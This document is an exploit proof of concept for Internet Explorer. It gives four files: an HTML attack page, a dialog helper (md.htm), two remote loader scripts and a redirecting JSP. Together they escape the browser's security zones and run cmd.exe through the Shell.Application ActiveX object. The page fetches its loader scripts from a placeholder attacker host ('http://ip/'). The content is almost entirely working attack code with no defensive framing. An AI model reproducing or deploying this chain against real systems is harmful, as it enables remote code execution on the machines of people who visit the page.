MS Internet Explorer Remote Application.Shell Exploit
=====================================================

<html>
<body>

<script language="Javascript">

function InjectedDuringRedirection(){
showModalDialog(&#039;md.htm&#039;,window,"dialogTop:-10000\;dialogLeft:-10000\;dialogHeight:1\;
dialogWidth:1\;").location="vbscript:\"<SCRIPT SRC=&#039;http://ip/shellscript_loader.js&#039;><\/script>\"";
}

</script>

<script language="javascript">

setTimeout("myiframe.execScript(InjectedDuringRedirection.toString())",100);
setTimeout("myiframe.execScript(&#039;InjectedDuringRedirection()&#039;) ",101);
document.write(&#039;<IFRAME ID=myiframe NAME=myiframe SRC="redir.jsp" style=display:none;></IFRAME>&#039;);

</script>

</body>
</html>

--------------------------------------------------------- md.htm  ---------------------------------------------------------
<SCRIPT language="javascript">

window.returnValue = window.dialogArguments;

function CheckStatus(){
try{tempVar=window.dialogArguments.location.href;}catch(e){window.close();}
setTimeout("CheckStatus()",100);
}

CheckStatus();

</SCRIPT>

--------------------------------------------------- shellscript_loader.js  ---------------------------------------------------
function getRealShell() {
myiframe.document.write("<SCRIPT SRC=&#039;http://ip/shellscript.js&#039;><\/SCRIPT>");
}

document.write("<IFRAME ID=myiframe SRC=&#039;about:blank&#039; WIDTH=200 HEIGHT=200></IFRAME>");
setTimeout("getRealShell()",100);

------------------------------------------------------- shellscript.js  -------------------------------------------------------
function injectIt() {
document.frames[0].document.body.insertAdjacentHTML(&#039;afterBegin&#039;,&#039;injected<script language=
"JScript" DEFER>var obj=new ActiveXObject("Shell.Application");obj.ShellExecute("cmd.exe","/c pause");</script>&#039;);
}
document.write(&#039;<iframe src="shell:WINDOWS\\Web\\TIP.HTM"></iframe>&#039;);
setTimeout("injectIt()", 1000);

--------------------------------------------------------- redir.jsp  ----------------------------------------------------------
<% Thread.sleep(1500);
response.setStatus(302);
response.setHeader("Location", "URL:res://shdoclc.dll/HTTP_501.htm"); 
%>



